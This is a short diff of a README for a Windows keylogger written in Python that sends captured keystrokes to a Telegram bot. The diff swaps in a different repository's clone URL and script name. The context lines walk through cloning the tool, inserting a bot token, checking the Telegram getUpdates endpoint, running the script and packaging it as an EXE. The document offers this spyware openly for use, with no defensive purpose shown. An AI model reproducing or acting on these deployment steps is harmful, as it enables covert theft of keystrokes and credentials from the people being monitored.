@@ -25,8 +25,8 @@ This is a Python-based keylogger that logs keystrokes and sends them to a Telegr
 🚀 How to Use
 🔹 Step 1: Clone or Download
   ```bash
-git clone https://github.com/localhostvicky/window_keylogger.git
-cd window_keylogger
+git clone https://github.com/whitedevil-21/WINDOWS-KEYLOGGER.git
+cd WINDOWS-KEYLOGGER
   ```
 🔹 Step 2: Edit Script
 Open the script and replace these values:
@@ -43,7 +43,7 @@ https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
 Run it directly:
 
   ```bash
-python window_keylogger.py
+python KEYLOGGER.py
   ```
 
 Or create a Windows EXE file:
